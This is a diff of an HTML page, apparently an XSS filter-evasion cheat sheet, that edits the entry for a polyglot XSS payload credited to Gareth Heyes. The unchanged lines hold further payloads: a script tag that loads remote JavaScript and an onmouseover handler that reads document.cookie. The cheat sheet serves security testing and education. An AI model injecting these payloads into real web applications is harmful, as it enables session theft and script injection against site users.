@@ -3974,8 +3974,10 @@
 <p>This is a normal XSS JavaScript injection, and most likely to get caught but I suggest trying it first (the quotes are not required in any modern browser so they are omitted here):</p>
 <p><code>&lt;SCRIPT SRC=https://cdn.jsdelivr.net/gh/Moksh45/host-xss.rocks/index.js&gt;&lt;/SCRIPT&gt;</code></p>
 <h3 id="xss-locator-polygot">XSS Locator (Polygot)<a class="headerlink" href="#xss-locator-polygot" title="Permanent link">&para;</a></h3>
-<p>The following is a "polygot test XSS payload." This test will execute in multiple contexts including html, script string, js and URL. Thank you to <a href="https://twitter.com/garethheyes">Gareth Heyes</a> for this <a href="https://twitter.com/garethheyes/status/997466212190781445">contribution</a>.</p>
-<p><code>javascript:/*--&gt;&lt;/title&gt;&lt;/style&gt;&lt;/textarea&gt;&lt;/script&gt;&lt;/xmp&gt;&lt;svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'&gt;</code></p>
+<p>The following is a "polyglot test XSS payload." This test will execute in multiple contexts including html, script string, js and URL. (Based on this <a href="https://twitter.com/garethheyes/status/997466212190781445">tweet</a> by <a href="https://twitter.com/garethheyes">Gareth Heyes</a>).</p>
+<div class="highlight"><pre><span></span><code>javascript:/*--&gt;&lt;/title&gt;&lt;/style&gt;&lt;/textarea&gt;&lt;/script&gt;&lt;/xmp&gt;
+&lt;svg/onload=&#39;+/&quot;`/+/onmouseover=1/+/[*/[]/+alert(42);//&#39;&gt;
+</code></pre></div>
 <h3 id="malformed-a-tags">Malformed A Tags<a class="headerlink" href="#malformed-a-tags" title="Permanent link">&para;</a></h3>
 <p>Skip the HREF attribute and get to the meat of the XXS... Submitted by David Cross \~ Verified on Chrome</p>
 <p><code>\&lt;a onmouseover="alert(document.cookie)"\&gt;xxs link\&lt;/a\&gt;</code></p>
